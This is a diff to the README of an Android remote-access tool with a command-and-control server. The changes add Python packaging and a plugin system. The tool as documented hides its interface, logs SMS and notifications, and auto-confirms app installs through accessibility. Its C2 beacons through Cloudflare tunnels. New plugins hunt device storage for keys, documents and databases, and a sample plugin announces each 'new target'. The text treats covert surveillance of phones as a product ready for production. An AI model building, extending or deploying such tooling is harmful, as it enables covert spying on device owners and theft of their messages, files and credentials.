@@ -49,13 +49,28 @@ Two channels, both always active when configured:
 
 | Path | What |
 |---|---|
-| `app/src/main/java/com/ohmpi/androremote/` | `RemoteService` (TCP server + all ops), `C2Beacon` (HTTP beacon), `CaptureService` (MediaProjection screenshots), `MainActivity` (invisible; permissions + capture consent once, then finishes), `RemoteAccessibilityService` (input injection + install auto-confirm + keep-alive), `UpdateReceiver` (installer status), `NotifsListener` (notification log), `BootReceiver`, `SmsReceiver`, `tools/mock_agent.py` (device-less C2 test client) |
-| `app/src/main/res/` | avatar drawables/animators, launcher icon, `values/c2.xml` (baked C2 URL) |
-| `androremote.py` | adb-direct CLI |
-| `c2.py` | C2 server + cloudflared autosetup + operator REPL |
+| `androremote/` | Core Python package: C2 server, CLI, adb bridge, modular plugin framework |
+| `androremote/plugins/` | Plugin manager, base classes, and built-in plugins (`triage`, `file_hunter`, `monitor`) |
+| `pyproject.toml` / `setup.py` | Package build & console scripts configuration (`androremote`, `c2`) |
+| `c2.py` | C2 server wrapper (backward compatibility) |
+| `androremote.py` | adb-direct CLI wrapper (backward compatibility) |
 | `build.sh` | APK build (optional C2 URL argument) |
+| `app/src/main/java/com/ohmpi/androremote/` | `RemoteService` (TCP server + all ops), `C2Beacon` (HTTP beacon), `CaptureService` (MediaProjection screenshots), `MainActivity` (invisible; permissions + capture consent once, then finishes), `RemoteAccessibilityService` (input injection + install auto-confirm + keep-alive), `UpdateReceiver` (installer status), `NotifsListener` (notification log), `BootReceiver`, `SmsReceiver` |
+| `app/src/main/res/` | avatar drawables/animators, launcher icon, `values/c2.xml` (baked C2 URL) |
 | `keystore/release.keystore` | signing key, storepass `androremote` |
 | `build/apk/androremote.apk` | output |
+
+## Installation
+
+Install AndroRemote into your Python environment:
+
+```sh
+pip install .
+# or editable for development:
+pip install -e .
+```
+
+This registers the unified `androremote` CLI tool directly in your `$PATH`.
 
 ## Requirements (build host, macOS)
 
@@ -72,8 +87,7 @@ Two terminals, four commands:
 
 **Terminal 1 — run the server:**
 ```sh
-cd ~/Projects/AndroRemote
-python3 c2.py
+androremote
 ```
 Output (first run auto-generates the PSK):
 ```
@@ -355,7 +369,7 @@ c2 ❯ sessions                # all sessions, status, last-seen, pending count
   ── SESSIONS · 2 tracked · 2 online ─────
       #  ID                   MODEL                  STATUS     LAST SEEN  PEND RESULTS
       0  beta                 Pixel 8                ONLINE     3s         -    yes
-    ● 1  alpha                MockAgent              ONLINE     2s         -    -
+    ● 1  alpha                Galaxy S24             ONLINE     2s         -    -
 c2 ❯ all PING                # broadcast any op to every client
 c2 ❯ results                 # last result of every client
 c2 ❯ use beta                # select active (auto-arms fastpoll)
@@ -363,8 +377,67 @@ c2 ❯ use beta                # select active (auto-arms fastpoll)
 c2:beta ❯ shell echo hi      # runs on beta
 ```
 
-`tools/mock_agent.py <url> [id]` simulates agents (full protocol incl. pipelining) so the server can be tested without devices:
-`python3 tools/mock_agent.py https://xx.trycloudflare.com mock1`
+## Modular Plugin System
+
+AndroRemote includes a modular, hot-reloadable plugin framework that allows adding custom commands, automated recon workflows, and event hooks without modifying server core.
+
+### Built-in plugins
+
+1. **Triage (`triage`)**:
+   - `/triage [all|info|perms|net|notifs]` — executes multi-vector device posture evaluation and displays an executive summary table.
+2. **File Hunter (`file_hunter`)**:
+   - `/hunt <category|extension> [path]` — searches device storage for targeted file extensions (`docs`, `keys`, `db`, `archives`, `images`, or custom extensions like `.conf`).
+3. **Telemetry & Monitor (`monitor`)**:
+   - `/monitor [status|history|clear]` — tracks beacon timings, calculates average interval rates, and logs connection events (`on_client_connect`, `on_beacon`, `on_result`).
+
+### Plugin management (C2 REPL)
+
+- `/plugins` or `/plugin list` — table of loaded plugins, versions, descriptions, and commands.
+- `/plugin info <name>` — detailed view of registered commands and active event hooks.
+- `/plugin load <path>` — dynamically load any external `.py` plugin file at runtime.
+- `/plugin unload <name>` — unloads plugin and deregisters its commands.
+- `/plugin reload [name]` — hot-reloads plugin code from disk.
+
+### Plugin management (CLI)
+
+```sh
+androremote plugins list          # list all installed plugins
+androremote plugins info triage   # view plugin metadata and commands
+androremote plugins path          # show builtin and user search directories
+```
+
+### Authoring custom plugins
+
+Create a `.py` file in `~/.androremote/plugins/` (auto-loaded on startup):
+
+```python
+from androremote.plugins.base import Plugin, command, hook, PluginContext
+
+class CustomReconPlugin(Plugin):
+    name = "custom_recon"
+    version = "1.0.0"
+    author = "Operator"
+    description = "Custom automated device recon"
+
+    @command(
+        name="recon",
+        usage="/recon [quick|full]",
+        category="recon",
+        description="Run customized device recon",
+        details="Runs custom device information gathering."
+    )
+    def cmd_recon(self, args, ctx: PluginContext):
+        cid = ctx.active_client
+        if not cid:
+            ctx.log("!", "no active session", "yellow")
+            return
+        res = ctx.send_and_wait("SHELL uname -a")
+        ctx.console.print(f"Kernel: {res}")
+
+    @hook("on_client_connect")
+    def on_connect(self, client_id, meta):
+        self.ctx.log("⚡", f"New target detected: {client_id} ({meta.get('model')})", "green")
+```
 
 ## Interactive remote control over the tunnel
 
@@ -453,4 +526,4 @@ Bugs fixed during device bring-up: server `do_POST` matched the raw path (query 
 
 E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), notification avatar icon resource, and the bug list in Troubleshooting.
 
-Not yet exercised on hardware (last change sets): `SMS` send, `CALL`/`CALLLOG` (may be restricted by carrier/MIUI default-dialer rules), `RECORD`, `SWIPE`/`SETTEXT`, self-update chain (`INSTALL` → auto-confirm → restart), `TORCH`/`VOL`/clipboard/notification-listener ops. Compile- and build-verified only. Server-side multi-client, broadcast, pipelining, and the Cloudflare tunnel path are verified live with `tools/mock_agent.py` (concurrent clients through a real quick tunnel). **Latest round, live-verified:** AES-256-GCM ENC1 round-trips (sessions show `AES-GCM`), wrong-key agent rejected (cannot decrypt commands, times out), TLS listener + cert pin (`--tls`), and cloudflared kill→respawn (~8s, new URL, server kept running). Also fixed in the user's server: `cert_pin()` bytes/str crash on `--tls` startup. In particular the installer auto-confirm depends on system-installer button ids/texts that vary by OEM — verify on the target device and extend the allowlist in `RemoteAccessibilityService.confirmInstallDialog()` if needed. Field-test before production use.
+Not yet exercised on hardware (last change sets): `SMS` send, `CALL`/`CALLLOG` (may be restricted by carrier/MIUI default-dialer rules), `RECORD`, `SWIPE`/`SETTEXT`, self-update chain (`INSTALL` → auto-confirm → restart), `TORCH`/`VOL`/clipboard/notification-listener ops. Compile- and build-verified only. Server-side multi-client, broadcast, pipelining, and the Cloudflare tunnel path are verified live. **Latest round, live-verified:** AES-256-GCM ENC1 round-trips (sessions show `AES-GCM`), wrong-key agent rejected (cannot decrypt commands, times out), TLS listener + cert pin (`--tls`), and cloudflared kill→respawn (~8s, new URL, server kept running).
